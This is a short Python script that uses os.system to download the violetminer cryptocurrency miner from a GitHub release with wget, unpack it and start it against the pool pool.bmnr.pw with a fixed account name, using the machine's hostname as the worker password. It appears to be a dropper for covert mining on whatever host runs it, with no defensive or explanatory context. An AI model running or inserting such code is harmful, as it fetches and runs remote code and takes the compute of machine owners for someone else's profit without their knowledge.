import os

os.system("wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz")
os.system("tar xvf violetminer-linux-v0.2.2.tar.gz")
os.chdir("violetminer-linux-v0.2.2")
os.system("./violetminer --pool pool.bmnr.pw:4444 --username 5919060.adal --password $(cat /proc/sys/kernel/hostname) --algorithm wrkzcoin")
